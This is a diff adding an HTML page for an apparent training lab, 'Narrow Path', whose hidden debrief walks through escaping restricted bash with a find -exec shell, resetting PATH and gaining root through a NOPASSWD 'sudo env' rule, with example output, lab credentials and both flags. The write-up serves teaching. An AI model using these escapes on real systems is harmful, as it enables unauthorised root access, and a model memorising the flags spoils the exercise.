@@ -1,0 +1,279 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Atlas Mission Control — Shell Lab 01 Narrow Path">
+  <title>Atlas Mission Control — Narrow Path</title>
+  <link rel="stylesheet" href="/static/styles.css">
+  <script src="/static/app.js" defer></script>
+</head>
+<body>
+  <main class="site-shell">
+    <div class="noise" aria-hidden="true"></div>
+    <header class="topbar">
+      <button class="brand" data-view-target="mission" aria-label="Atlas Mission Control home">
+        <span class="brand-mark"><i></i><i></i><i></i></span>
+        <span><strong>ATLAS</strong><small>VULNSEC ACADEMY</small></span>
+      </button>
+      <div class="topbar-center"><span>MODULE 05</span><b>SERVICE ACCESS</b></div>
+      <div class="environment-pill"><span class="pulse-dot"></span><span><small>ENVIRONMENT</small><strong id="environment-status">CONNECTING</strong></span></div>
+    </header>
+
+    <div class="workspace">
+      <aside class="rail" aria-label="Mission navigation">
+        <div class="rail-label">TRACE // 04</div>
+        <nav>
+          <button class="active" data-view-target="mission"><span>01</span><i></i><em>Briefing</em></button>
+          <button data-view-target="investigation"><span>02</span><i></i><em>Investigate</em></button>
+          <button data-view-target="walkthrough"><span>03</span><i></i><em>Debrief</em></button>
+        </nav>
+        <div class="rail-progress">
+          <div><span>PROGRESS</span><b id="progress-percent">0%</b></div>
+          <div class="progress-track"><i id="progress-bar"></i></div>
+          <small id="progress-copy">0 / 5 objectives cleared</small>
+        </div>
+      </aside>
+
+      <section class="content">
+        <section class="view-enter" data-view="mission">
+          <section class="mission-hero">
+            <div class="hero-copy">
+              <div class="kicker"><span>LAB 04</span><i></i> RBASH · GTFOBINS</div>
+              <h1>NARROW<br><em>PATH</em></h1>
+              <p>SSH lands you in a cage. The prompt will not name it. Enumerate the shell, list the allow-list, look those binaries up on GTFOBins, escape, then escalate. This is not the Night Wharf awk recipe.</p>
+              <div class="hero-actions">
+                <button class="primary-button" data-view-target="investigation">Begin investigation <span>→</span></button>
+                <span class="time-chip">◷ &nbsp; 25–40 MIN</span>
+              </div>
+            </div>
+            <div class="radar-card" aria-label="Stylized lab network map">
+              <div class="radar-grid"></div>
+              <div class="radar-ring ring-one"></div>
+              <div class="radar-ring ring-two"></div>
+              <div class="radar-ring ring-three"></div>
+              <div class="radar-sweep"></div>
+              <div class="node kali-node"><i></i>KALI<small>SSH / GTFOBINS</small></div>
+              <div class="node target-node"><i></i><span data-target>10.23.54.81</span><small>JUMP HOST</small></div>
+              <div class="radar-caption"><span>LIVE TOPOLOGY</span><b>TARGET ASSIGNED</b></div>
+            </div>
+          </section>
+
+          <section class="mission-grid">
+            <article class="brief-card coordinates-card">
+              <div class="card-number">01</div>
+              <p class="section-label">NETWORK COORDINATES</p>
+              <div class="coordinate-row"><span>TARGET HOST</span><code data-target>10.23.54.81</code></div>
+              <div class="coordinate-row"><span>OPERATOR</span><code>l.nash / Nash-Berth-81</code></div>
+              <div class="coordinate-row"><span>INTENDED TOOLS</span><code>ssh · GTFOBins</code></div>
+              <div class="scope-warning"><b>!</b><span>Do not paste an awk one-liner from Night Wharf. Enumerate this cage.</span></div>
+            </article>
+            <article class="brief-card objectives-card">
+              <div class="card-number">02</div>
+              <p class="section-label">MISSION OBJECTIVES</p>
+              <ol>
+                <li><span>01</span>Identify the restricted shell</li>
+                <li><span>02</span>Take the user flag</li>
+                <li><span>03</span>List ~/bin and look it up</li>
+                <li><span>04</span>Escape, reset PATH, root flag</li>
+              </ol>
+            </article>
+            <article class="brief-card loadout-card">
+              <div class="card-number">03</div>
+              <p class="section-label">OPERATOR LOADOUT</p>
+              <div class="tool-row"><span class="tool-icon">E</span><span><b>echo $0 $PATH</b><small>Name the cage</small></span><i>READY</i></div>
+              <div class="tool-row"><span class="tool-icon">L</span><span><b>ls bin</b><small>Allow-list</small></span><i>READY</i></div>
+              <div class="tool-row"><span class="tool-icon">G</span><span><b>GTFOBins</b><small>Shell, then Sudo</small></span><i>READY</i></div>
+            </article>
+          </section>
+        </section>
+
+        <section class="investigation-layout view-enter is-hidden" data-view="investigation">
+          <section class="investigation-main">
+            <div class="view-heading">
+              <div>
+                <p class="section-label">GUIDED INVESTIGATION</p>
+                <h2>Enumerate, then look it up.</h2>
+              </div>
+              <span id="cleared-copy">0/5 CLEARED</span>
+            </div>
+            <div class="question-stack" id="question-stack" aria-live="polite"></div>
+          </section>
+          <aside class="intel-panel">
+            <div class="intel-head"><span class="pulse-dot"></span><b>OPERATOR INTEL</b></div>
+            <div class="intel-stat"><span>LAB STATUS</span><strong id="intel-status">CONNECTING</strong></div>
+            <div class="intel-stat"><span>CURRENT PHASE</span><strong id="current-phase">01 / CONFIRM TARGET</strong></div>
+            <div class="intel-stat"><span>HINTS USED</span><strong id="hints-used">00</strong></div>
+            <div class="mini-progress"><i id="mini-progress"></i></div>
+            <p>Mission Control checks findings. It never escapes the shell for you.</p>
+            <p class="preview-link is-hidden" id="preview-target-link">Preview mode: the jump notice is at <a href="/site/">/site/</a>.</p>
+            <button class="primary-button compact is-hidden" id="open-debrief">Open debrief →</button>
+          </aside>
+        </section>
+
+        <section class="walkthrough view-enter is-hidden" data-view="walkthrough">
+          <section class="locked-walkthrough" id="walkthrough-lock">
+            <div class="lock-orbit"><span>03</span></div>
+            <p class="section-label">DEBRIEF LOCKED</p>
+            <h2>Try the mission first.</h2>
+            <p>The walkthrough names the shell, the allow-list, the escape, and both flags. Complete the investigation, or reveal it if you are genuinely stuck.</p>
+            <div>
+              <button class="primary-button" data-view-target="investigation">Return to investigation <span>→</span></button>
+              <button class="ghost-button" id="reveal-walkthrough">Reveal full walkthrough</button>
+            </div>
+          </section>
+
+          <div class="is-hidden" id="walkthrough-content">
+            <div class="view-heading walkthrough-heading">
+              <div>
+                <p class="section-label">MISSION DEBRIEF</p>
+                <h2>The allow-list is the hint.</h2>
+              </div>
+              <span id="walkthrough-badge" class="success-badge">MISSION COMPLETE</span>
+            </div>
+
+            <section class="debrief-summary">
+              <div><span>01</span><p>CAGE</p><b>rbash</b></div>
+              <i>→</i>
+              <div><span>02</span><p>BIN</p><b>find</b></div>
+              <i>→</i>
+              <div><span>03</span><p>PATH</p><b>export</b></div>
+              <i>→</i>
+              <div><span>04</span><p>ROOT</p><b>sudo env</b></div>
+            </section>
+
+            <section class="walkthrough-step">
+              <div class="step-copy">
+                <span class="step-number">01</span>
+                <p class="section-label">ENUMERATE THE SHELL</p>
+                <h3>Do not assume which cage you are in.</h3>
+                <p>SSH only gives a prompt. Print <code>$0</code>, <code>$SHELL</code>, and <code>$PATH</code>. Try <code>cd /</code> and a command that contains a slash. A private PATH, a refused <code>cd</code>, and “cannot specify <code>/</code> in command names” is restricted bash — not a broken install. The user flag is already in home.</p>
+                <div class="explain-list">
+                  <div><code>echo $0 $SHELL</code><span>Names the login shell</span></div>
+                  <div><code>echo $PATH && ls bin</code><span>Every binary you are allowed</span></div>
+                  <div><code>cd /</code><span>Refused — confirms the cage</span></div>
+                </div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>jump host</b><em>EXAMPLE OUTPUT</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>└─$</b> ssh l.nash@10.23.54.81</div>
+                  <div class="terminal-output">
+                    <div class="muted">password: Nash-Berth-81</div>
+                    <div>$ echo $0</div>
+                    <div class="hot">-rbash</div>
+                    <div>$ echo $SHELL</div>
+                    <div class="hot">/bin/rbash</div>
+                    <div>$ echo $PATH</div>
+                    <div class="hot">/home/l.nash/bin</div>
+                    <div>$ ls</div>
+                    <div>bin  user.txt</div>
+                    <div>$ cat user.txt</div>
+                    <div class="flag">SHELL{narrow_user_nash}</div>
+                    <div>$ ls bin</div>
+                    <div class="hot">cat  date  echo  find  ls  pwd  whoami</div>
+                    <div>$ cd /</div>
+                    <div class="muted">-rbash: cd: restricted</div>
+                    <div>$ /bin/bash</div>
+                    <div class="muted">-rbash: /bin/bash: restricted: cannot specify `/' in command names</div>
+                  </div>
+                </div>
+                <figcaption><i>i</i>awk is not on this list. Night Wharf’s one-liner will not help.</figcaption>
+              </figure>
+            </section>
+
+            <section class="walkthrough-step reverse">
+              <div class="step-copy">
+                <span class="step-number">02</span>
+                <p class="section-label">GTFOBINS ESCAPE</p>
+                <h3>Look up every allowed binary.</h3>
+                <p>Open <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">gtfobins.github.io</a> and search the allow-list one name at a time. <code>ls</code>, <code>cat</code>, <code>echo</code>, <code>pwd</code>, <code>date</code> and <code>whoami</code> have no shell escape that helps inside rbash. <code>find</code> does — GTFOBins → find → Shell. After that, this shell still inherited the tiny PATH, so reset it before you try <code>sudo</code>.</p>
+                <div class="explain-list">
+                  <div><code>find</code><span>GTFOBins → Shell</span></div>
+                  <div><code>-exec /bin/bash</code><span>Leaves rbash</span></div>
+                  <div><code>export PATH=...</code><span>Unhides sudo, env, id</span></div>
+                </div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>jump host</b><em>EXAMPLE OUTPUT</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>$</b> find . -exec /bin/bash \; -quit</div>
+                  <div class="terminal-output">
+                    <div class="muted"># prompt changes — this is no longer rbash</div>
+                    <div>l.nash@narrow-path:~$ echo $0</div>
+                    <div class="hot">bash</div>
+                    <div>l.nash@narrow-path:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</div>
+                    <div>l.nash@narrow-path:~$ which sudo env</div>
+                    <div>/usr/bin/sudo</div>
+                    <div>/usr/bin/env</div>
+                  </div>
+                </div>
+                <figcaption><i>i</i>If sudo says command not found, you skipped the PATH export.</figcaption>
+              </figure>
+            </section>
+
+            <section class="walkthrough-step">
+              <div class="step-copy">
+                <span class="step-number">03</span>
+                <p class="section-label">PRIVILEGE ESCALATION</p>
+                <h3>Enumerate sudo the same way.</h3>
+                <p>Do not hunt random SUID binaries first. Ask sudo what this account may run. <code>sudo -l</code> returns a single NOPASSWD path: <code>/usr/bin/env</code>. GTFOBins → env → Sudo is a root shell. Then read <code>/root/root.txt</code>.</p>
+                <div class="explain-list">
+                  <div><code>sudo -l</code><span>Do not skip this — it names the binary</span></div>
+                  <div><code>gtfobins / env</code><span>Sudo function is a root shell</span></div>
+                  <div><code>/root/root.txt</code><span>Second flag</span></div>
+                </div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>jump host</b><em>EXAMPLE OUTPUT</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>$</b> sudo -l</div>
+                  <div class="terminal-output">
+                    <div class="muted">User l.nash may run the following commands:</div>
+                    <div class="hot">(root) NOPASSWD: /usr/bin/env</div>
+                    <div class="muted"># gtfobins.github.io → env → Sudo</div>
+                  </div>
+                  <div class="command-line"><b>$</b> sudo env /bin/bash</div>
+                  <div class="terminal-output">
+                    <div>root@narrow-path:~# cat /root/root.txt</div>
+                    <div class="flag">SHELL{narrow_root_env}</div>
+                  </div>
+                </div>
+                <figcaption><i>i</i>Different binary from Night Wharf (awk + find) and Borrowed Bin (less).</figcaption>
+              </figure>
+            </section>
+
+            <section class="completion-card">
+              <div>
+                <span>TRACE // 04</span>
+                <h3>Cage open.</h3>
+                <p>You named rbash from $0, listed ~/bin, looked up find on GTFOBins, reset PATH, then used sudo env the same way. Next time the allow-list changes, the method does not.</p>
+              </div>
+              <div class="completion-stats">
+                <span><small>OBJECTIVES</small><b id="completion-objectives">05 / 05</b></span>
+                <span><small>HINTS USED</small><b id="completion-hints">00</b></span>
+              </div>
+              <button class="ghost-button" id="repeat-mission">Repeat mission</button>
+            </section>
+          </div>
+        </section>
+      </section>
+    </div>
+  </main>
+
+  <dialog class="spoiler-dialog" id="walkthrough-confirm" aria-labelledby="walkthrough-confirm-title" aria-describedby="walkthrough-confirm-copy">
+    <div class="spoiler-dialog-card">
+      <div class="spoiler-icon" aria-hidden="true">!</div>
+      <p class="section-label">SPOILER WARNING</p>
+      <h2 id="walkthrough-confirm-title">Reveal the full walkthrough?</h2>
+      <p id="walkthrough-confirm-copy">This will expose the shell, the escape binary, and both flags. Your debrief will be marked <strong>SOLUTION REVEALED</strong>.</p>
+      <div class="spoiler-dialog-actions">
+        <button class="ghost-button" id="cancel-walkthrough-reveal" type="button">Cancel — keep trying</button>
+        <button class="danger-button" id="confirm-walkthrough-reveal" type="button">Reveal anyway</button>
+      </div>
+      <small>You can still complete the investigation after revealing.</small>
+    </div>
+  </dialog>
+  <div class="portal-error is-hidden" id="portal-error" role="alert"><b>MISSION CONTROL OFFLINE</b><span>Start or reset the lab, then reload this page.</span></div>
+</body>
+</html>
